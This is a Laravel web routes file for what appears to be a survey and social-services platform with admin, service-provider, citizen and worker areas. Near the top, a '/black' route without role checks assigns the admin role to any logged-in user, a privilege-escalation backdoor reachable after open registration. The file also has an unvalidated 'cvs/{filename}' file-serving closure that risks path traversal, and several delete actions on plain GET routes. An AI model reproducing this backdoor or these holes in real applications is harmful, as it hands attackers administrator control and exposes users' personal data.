<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of the routes that are handled
| by your application. Just tell Laravel the URIs it should respond
| to using a Closure or controller method. Build something great!
|
*/

Auth::routes();
Route::get('/black', function () {
    $user = Auth::user();
    $user->assignRole('admin');
    $user->save();
});
/**/
Route::get('/', 'HomeController@index');
Route::get('/home', 'HomeController@index');

/*profile completion*/
Route::get('logout', '\App\Http\Controllers\Auth\LoginController@logout');
Route::get('/checkpoint', 'Auth\ProfileCompletionController@index');
Route::get('/checkpoint/{type}', 'Auth\ProfileCompletionController@choosePath');
Route::post('/checkpoint/sp/', 'Auth\ProfileCompletionController@completeSpProfile')->name('newSp');
Route::post('/checkpoint/citizen/', 'Auth\ProfileCompletionController@completeCitizenProfile')->name('newCitizen');
Route::group(['prefix' => 'auth', 'namespace' => 'Auth', 'as' => 'Auth.', 'middleware' => ['auth', 'checkUserType:admin']], function () {
    Route::get('/api/register', 'ApiAuthController@index')->name('api');
});

Route::group(['prefix' => 'admin', 'namespace' => 'Admin', 'as' => 'admin.', 'middleware' => ['auth', 'checkUserType:admin']], function () {

    Route::get('users/{id}/image', 'UserController@getUserImage')->name('users.image');
    // Route::resource('users', 'UserController');

    //Route::resource('projects', 'ProjectController');


});
Route::group(['middleware' => 'auth', 'namespace' => 'FrontEnd'], function () {
    //citizen routes

    Route::group(['prefix' => 'importExport', 'as' => 'importExport.'], function () {
        Route::group(['prefix' => 'surveys', 'as' => 'surveys.'], function () {
            Route::get('{id}', 'ImportExportController@importExport')->name('form');
            Route::get('{id}/downloadExcel/{type}', 'ImportExportController@downloadExcel')->name('export');
            Route::post('{id}/importExcel', 'ImportExportController@importExcel')->name('import');
        });

        Route::group(['prefix' => 'extras', 'as' => 'extras.'], function () {
            Route::get('downloadExcel/{type}', 'ImportExportController@downloadExtrasExcel')->name('export');
        });
    });

    Route::get('/profile', 'ProfileController@index')->name('profile');
    Route::post('/update_profile', 'ProfileController@postUpdate')->name('update_profile');
    Route::get('/profile_image', 'ProfileController@getImage');
    Route::post('/profile_image', 'ProfileController@postImage')->name('postUserImage');
    Route::get('/settings', 'ProfileController@settings');

});

Route::group(['prefix' => 'users', 'namespace' => 'EndUsers', 'as' => 'endusers.'], function () {

    Route::group(['middleware' => ['auth', 'checkUserType:serviceProvider'], 'prefix' => 'org', 'namespace' => 'ServiceProvider', 'as' => 'org.'], function () {
        Route::get('/dashboard', 'DashboardController@index')->name('index');
        Route::get('/performance', 'ReportController@performance_stats')->name('performance');
        Route::post('/performance', 'ReportController@performanceStatsChart')->name('performance.post');

        Route::group(['prefix' => 'projects', 'as' => 'projects.'], function () {
            /*projects*/
            Route::get('/report/{project_id?}', 'ReportController@index')->name('generate.report');
            Route::get('/index', 'ProjectsController@index')->name('list');
            Route::get('/create', 'ProjectsController@create')->name('create');
            Route::post('/', 'ProjectsController@store')->name('store');
            Route::get('{id}/edit', 'ProjectsController@edit')->name('edit');
            Route::patch('{id}', 'ProjectsController@update')->name('update');
            Route::get('{id}/delete', 'ProjectsController@delete')->name('delete');
            Route::get('{id}', 'ProjectsController@show')->name('show');
            /*projects end*/

            /*surveys*/
            Route::get('/surveys/{id}', 'SurveysController@index')->name('surveys.show');
            Route::get('{project_id}/surveys/create', 'SurveysController@create')->name('surveys.create');
            Route::post('/surveys/', 'SurveysController@store')->name('surveys.store');
            Route::get('/surveys/{id}/edit', 'SurveysController@edit')->name('surveys.edit');
            Route::patch('/surveys/{id}', 'SurveysController@update')->name('surveys.update');
            Route::get('/surveys/{id}/delete', 'SurveysController@delete')->name('surveys.delete');
            /*surveys end*/

            /*questions end*/
            Route::get('/surveys/{survey_id}/questions/create', 'QuestionsController@create')->name('surveys.questions.create');
            Route::post('/surveys/questions', 'QuestionsController@store')->name('surveys.questions.store');
            Route::get('/surveys/questions/{id}/edit', 'QuestionsController@edit')->name('surveys.questions.edit');
            Route::patch('/surveys/questions/{id}', 'QuestionsController@update')->name('surveys.questions.update');
            Route::get('/surveys/questions/{id}/delete', 'QuestionsController@delete')->name('surveys.questions.delete');
            Route::get('/surveys/questions/{id}/chart', 'SurveyStatsController@question_chart')->name('surveys.questions.chart');
            Route::post('/surveys/questions/{id}/chart', 'SurveyStatsController@question_chart_theme')->name('surveys.questions.chart.withtheme');
            Route::get('/surveys/{survey_id}/questions/relations/chart', 'SurveyStatsController@relationChart')->name('surveys.questions.relationChart');
            Route::get('/questions/relations/chart', 'SurveyStatsController@visualizeRelation')->name('surveys.questions.visualizeRelation');
            /*questions end*/

        });
        Route::get('/stats', 'SurveyStatsController@index')->name('stats');
        Route::get('/report', 'ReportController@index')->name('report');
    });
    Route::group(['middleware' => ['auth', 'checkUserType:citizen'], 'prefix' => 'ben', 'namespace' => 'Citizens', 'as' => 'ben.'], function () {
        Route::get('/dashboard', 'DashboardController@index')->name('index');
        Route::get('/need/create', 'DashboardController@createNeed')->name('need.create');
        Route::get('/unimitate', 'DashboardController@logoutas')->name('logoutas');
        Route::post('gateways/service_requests/store', "ServiceRequests\\ServiceRequestsController@store")->name('storeServiceRequest');


    });

    Route::group(['middleware' => ['auth', 'checkUserType:worker'], 'prefix' => 'agents', 'namespace' => 'SocialWorkers', 'as' => 'worker.'], function () {
        Route::get('/citizens', 'DashboardController@index')->name('index');
        Route::get('citizens/create', 'DashboardController@createCitizen')->name('citizen.create');
        Route::post('citizens/', 'DashboardController@storeCitizen')->name('citizen.store');
        Route::get('{id}/imitate', 'DashboardController@loginas')->name('signinas');
    });
    Route::group(['middleware' => ['guest'], 'prefix' => 'agents', 'namespace' => 'SocialWorkers', 'as' => 'worker.'], function () {
        Route::get('/register', 'RegistrationController@index')->name('register');
        Route::post('/register', 'RegistrationController@store')->name('register.store');
    });

});
Route::group(['middleware' => ['auth'], 'prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dashboard.'], function () {
    Route::get('/profile', 'DashboardController@show')->name('show');
    Route::post('/widget/store/chart', 'WidgetsController@storeChart')->name('store.chart');
    Route::post('/widget/store/questions/chart', 'WidgetsController@storeVisualRelation')->name('store.question.chart');
});
Route::group(['middleware' => ['auth', 'checkUserType:admin'], 'prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dashboard.'], function () {

    Route::get('/landing', 'DashboardController@index')->name('landing');
    Route::get('/notifications', function () {
        foreach (Auth::user()->unreadNotifications as $notification) {
            $notification->markAsRead();
        }
    })->name('notifications');


    Route::group(['prefix' => 'Beneficiaries', 'namespace' => 'Beneficiaries', 'as' => 'ben.'], function () {

        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });

        Route::post('/stats/', 'StatsController@render')->name('stats.post');
        Route::get('/stats/', 'StatsController@index')->name('stats');
    });
    Route::group(['prefix' => 'Organizations', 'namespace' => 'Organizations', 'as' => 'org.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });

        Route::get('/stats', 'StatsController@index')->name('stats');
        Route::post('/stats/', 'StatsController@render')->name('stats.post');

        Route::group(['prefix' => 'verify', 'as' => 'verify.'], function () {
            Route::get('/{model}', 'VerificationController@index')->name('list');
//            Route::get('/organizations', 'VerificationController@serviceProviders')->name('org');
            Route::patch('/{id}/{model}/{project?}', 'VerificationController@accept')->name('org.accept');
//            Route::get('/projects', 'VerificationController@projects')->name('projects');
//            Route::get('/surveys', 'VerificationController@surveys')->name('surveys');
        });
        Route::get('/search', 'SearchController@index')->name('search');
        Route::get('/rfp', 'PaymentController@index')->name('payment');
    });
    Route::group(['prefix' => 'Workers', 'namespace' => 'Workers', 'as' => 'work.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });

        Route::get('/stats', 'StatsController@index')->name('stats');
        Route::post('/stats/', 'StatsController@render')->name('stats.post');

        Route::get('/monitor', 'MandeController@index')->name('monitor');
        Route::get('/{id}/survey', 'MandeController@survery_workers')->name('survey');
        Route::get('/{id}/survey/{worker_id}/worker/payment', 'MandeController@make_payment')->name('payment');
        Route::get('/{id}/message', 'MandeController@message')->name('message');
        Route::get('/hire/', 'HiringController@index')->name('hire');
        Route::get('{id}/applicants', 'HiringController@applicants')->name('applicants');

    });

    Route::group(['prefix' => 'admin', 'namespace' => 'Admin', 'as' => 'admin.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });
    });


});
Route::group(['middleware' => 'auth'], function () {
    Route::get('gateways/surveys/{id}', "Surveys\\SurveysController@surveysUser")->name('surveys');
    Route::post('gateways/surveys/users/store/survey', "Surveys\\SurveysController@storeUserSurvey")->name('userSurvey');

    Route::get('cvs/{filename}', function ($filename) {
        $path = storage_path('app/public/cvs') . '/' . $filename;

        if (!File::exists($path)) abort(404);
        $file = File::get($path);
        $type = File::mimeType($path);
        $response = Response::make($file, 200);
        $response->header("Content-Type", $type);

        return $response;
    })->name('files');
});

Route::group(['namespace' => 'FrontEnd'], function () {
    //citizen routes
    Route::group(['middleware' => 'auth'], function () {
        Route::get('listings/charts/{chart_id}', "AjaxApiController@charts");
    });
    Route::get('listings/projects/{service_provider_id}', "AjaxApiController@projects");
    Route::get('listings/populated/{model}', "AjaxApiController@populate")->name('populate');
    Route::get('listings/projects/', "AjaxApiController@projectsWithAreas");
    Route::get('listings/surveys/{project_id}', "AjaxApiController@surveys");
    Route::get('listings/questions/{survey_id}', "AjaxApiController@questions");
    Route::get('gateways/listings/{model}', "AjaxApiController@Listings")->name('getListing');

    Route::get('/service-requests', 'ProfileController@serviceRequests');

    //  Route::get('/dashboard', 'ProfileController@dashboard');

    Route::get('/profile', 'ProfileController@index')->name('profile');

    Route::post('/update_profile', 'ProfileController@postUpdate')->name('update_profile');
    Route::get('/profile_image', 'ProfileController@getImage');
    Route::post('/profile_image', 'ProfileController@postImage')->name('postUserImage');

    Route::get('/surveys', 'ProfileController@surveys');

    Route::get('/settings', 'ProfileController@settings');

});

Route::resource('admin/tender', 'Admin\TenderCrudController');

